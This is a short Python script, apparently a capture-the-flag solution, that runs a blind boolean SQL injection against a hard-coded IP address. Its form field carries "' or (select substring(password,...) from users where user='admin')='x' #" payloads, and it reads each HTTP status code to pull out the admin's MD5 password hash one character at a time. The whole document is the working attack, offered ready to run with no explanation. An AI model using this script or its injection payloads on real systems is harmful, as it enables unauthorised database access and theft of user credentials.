# Written by kair0s3

import requests
import string
import base64

charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + "=/"
md5Charset = "abcdef" + string.digits

target = "http://54.251.213.12"

cookies = {
    "token": "BASE64-REDACTED"
}

# https://stackoverflow.com/questions/20759981/python-trying-to-post-form-using-requests

# Sanity checking
# ' or (select substring(user, 1, 1) from users where user='admin')='a' #

hash = ""
hashLength = 32 # since md5 hash

for i in range(len(hash), hashLength):
    for hex in md5Charset:
        print("Testing", hash + hex)
        files = {
            'hash': (None, f"' or (select substring(password, {i+1}, 1) from users where user='admin')='{hex}' #"),
            'tmpDir': (None, 'QzpcVGVtcFw='),
            'submit': (None, 'Submit')
        }

        r = requests.post(target + "/download", cookies=cookies, files=files, allow_redirects=False)

        # 500 for false condition, 200 for true condition. 
        # print(r.status_code)
        if r.status_code == 302:
            hash += hex
            print("Found! Uncompleted token:", hash)
            break

print("Final token:", hash)
